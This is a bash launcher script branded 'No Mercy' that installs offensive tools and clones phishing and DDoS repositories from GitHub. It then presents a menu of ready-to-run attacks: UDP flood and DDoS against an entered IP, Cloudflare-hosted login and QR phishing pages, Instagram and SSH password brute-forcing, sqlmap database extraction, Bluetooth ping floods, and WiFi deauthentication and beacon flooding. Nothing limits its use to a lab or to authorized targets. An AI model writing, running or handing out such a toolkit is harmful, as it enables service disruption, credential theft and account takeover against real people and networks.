#!/bin/bash

#Installations
read -p "Do you Want to Install Depencies [y/n]: " INSTALLDEP
if [ "$INSTALLDEP" == "y" ]; then
    sudo apt update && sudo apt upgrade -y
    sudo apt install figlet -y
    sudo apt install cowsay -y
    sudo apt install wifite -y
    sudo apt install hping3 -y
    sudo apt install airgeddon -y
    sudo apt install sherlock -y
    sudo apt install sqlmap -y
    sudo apt install sparrow-wifi -y
    sudo apt install nmap -y
    sudo apt install hydra -y
    sudo apt install mdk4 -y
    sudo apt install aircrack-ng -y
    git clone https://github.com/thakur2309/phonextract.git
    git clone https://github.com/Adrilaw/MedusaPhisher.git
    git clone https://github.com/wanzxploit/zphisher.git
    git clone https://github.com/palahsu/DDoS-Ripper.git
    git clone https://github.com/bakdala/instainsane.git
    cd MedusaPhisher
    chmod +x *
    ./setup.sh
    cd
    cd instainsane
    chmod +x *
    sudo ./install.sh
    cd
    sleep 1
fi
#Text color
RED="\e[31m"
YELLOW="\e[33m"
RESET="\e[0m"

#Figlet
clear
echo -e "${RED}"
figlet "No Mercy"
echo -e "${RESET}"
echo ""
echo ""
sleep 1

#Number List
echo -e "${YELLOW}"
echo "[1] WiFi Password Crack"
echo "[2] DoS IP Address"
echo "[3] DDoS IP/Website"
echo "[4] Login Phish"
echo "[5] Website Vulnerability Scan"
echo "[6] Bruteforce Instagram"
echo "[7] Phone Number Information"
echo "[8] Find Usernames"
echo "[9] Automated SQL Attack"
echo "[10] QR Code Phishing"
echo "[11] Analyze WiFi Networks"
echo "[12] Analyze IP Traffic"
echo "[13] Bruteforce SSH Login"
echo "[14] Bluetooth DoS"
echo "[15] WiFi DoS to Nearby Networks"
echo "[16] WiFi Deauthetication"
echo "[17] "

echo "[99] Exit"
echo -e "${RESET}"
echo ""

#Select From Number List
echo -e "${RED}"
read -p "Select: " NUM
echo -e "${RESET}"


if [ "$NUM" -eq 1 ]; then
    clear
    sudo wifite
    clear


elif [ "$NUM" -eq 2 ]; then
    clear
    network=$(ip -4 route | grep kernel | awk '{print $1}')
    read -p "Do You Want to Scan WiFi for IP Addresses and Ports? [y/n]: " DOSSCAN
    if [ "$DOSSCAN" == "y" ]; then
        nmap -p 80,135,22,5353,53,123,5060,161,162,1900,11211 "$network"
        echo ""
        echo ""
    elif [ "$DOSSCAN" == "n" ]; then
        # Do nothing, continue to next prompt
        :
    fi
    read -p "Input Valid Public/Private IP Address: " DOSIP
    read -p "Input Valid Port to DoS [80, 135, 22, 5353, 53, 123, 5056, 161, 162, 1900, 11211]: " DOSPORT
    sudo hping3 --udp --flood --destport "$DOSPORT" "$DOSIP"


elif [ "$NUM" -eq 3 ]; then
    clear
    cd DDoS-Ripper
    read -p "Ping Website for IP [y/n]: " DDOSPING
    if [ "$DDOSPING" == "y" ]; then
        read -p "Enter Website [http://]: " PINGSITE
        ping -c 4 "$PINGSITE"
    elif [ "$DDOSPING" == "n" ]; then
        # Do nothing, continue to next prompt
        :
    fi
    read -p "Enter IP to DDoS: " DDOSIP
    read -p "Enter Port to DDoS [22, 23, 53, 80, 123, 443, 1900, 11211]: " DDOSPORT
    python3 DRipper.py -s "$DDOSIP" -p "$DDOSPORT"


elif [ "$NUM" -eq 4 ]; then
    clear
    echo "Choose Cloudflare to Host on the Phish Website"
    sleep 2
    cd zphisher
    chmod +x *
    sudo ./zphisher.sh


elif [ "$NUM" -eq 5 ]; then
    clear
    read -p "What Website to Scan: " VULNSITE
    sudo nmap -sV --script vuln "$VULNSITE"


elif [ "$NUM" -eq 6 ]; then
    clear
    cd instainsane
    sudo ./instainsane.sh


elif [ "$NUM" -eq 7 ]; then
    clear
    cd phonextract
    python3 phonextract.py


elif [ "$NUM" -eq 8 ]; then
    clear
    read -p "Give A Username: " SHERLOCKUSER
    sherlock "$SHERLOCKUSER"


elif [ "$NUM" -eq 9 ]; then
    clear
    read -p "Enter Website [http://example/login]: " SQLISITE
    sqlmap -u "$SQLISITE" --dbs


elif [ "$NUM" -eq 10 ]; then
    clear
    cd MedusaPhisher
    ./medusa_phisher.sh


elif [ "$NUM" -eq 11 ]; then
    clear
    sudo sparrow-wifi


elif [ "$NUM" -eq 12 ]; then
    clear
    sudo nmap -sS "$network"
    read -p "What IP to Analyze Traffic From: " TRAFFICIP
    read -p "What Interface to Use: " TRAFFICINTERFACE
    wireshark -i "$TRAFFICINTERFACE" -f "host $TRAFFICIP"


elif [ "$NUM" -eq 13 ]; then
    clear
    sudo nmap -p 22 "$network"
    read -p "What IP to Bruteforce: " SSHIP
    read -p "What Username Does it Use: " SSHUSER
    read -p "What Path to Password File: " SSHPASSFILE
    hydra -t 4 -l "$SSHUSER" -P "$SSHPASSFILE" -I ssh://"$SSHIP"


elif [ "$NUM" -eq 14 ]; then
    clear
    bluetoothctl --timeout 12 scan on
    read -p "Bluetooth MAC Address to DoS: " BLUEDOSMAC
    sudo l2ping -i hci0 -s 10000 -f "$BLUEDOSMAC"


elif [ "$NUM" -eq 15 ]; then
    clear
    sudo airmon-ng start wlan0
    sudo mdk4 wlan0mon a
    sudo airmon-ng stop wlan0mon


elif [ "$NUM" -eq 16 ]; then
    clear
    sudo airmon-ng start wlan0
    sudo airodump-ng wlan0mon
    read -p "What MAC to Deauth: " DEAUTHMAC
    read -p "What Channel is the MAC: " DEAUTHCHANNEL
    sudo iwconfig wlan0mon channel "$DEAUTHCHANNEL"
    sudo aireplay-ng --deauth 0 -a "DEAUTHMAC" wlan0mon
    sudo airmon-ng stop wlan0mon


elif [ "$NUM" -eq 17 ]; then
    clear
    




elif [ "$NUM" -eq 99 ]; then
    clear
    echo "Quitting Script..."
    sleep 1
    clear
    exit


else
    echo "Invalid Option"
    sleep 1
    clear
    exit
fi
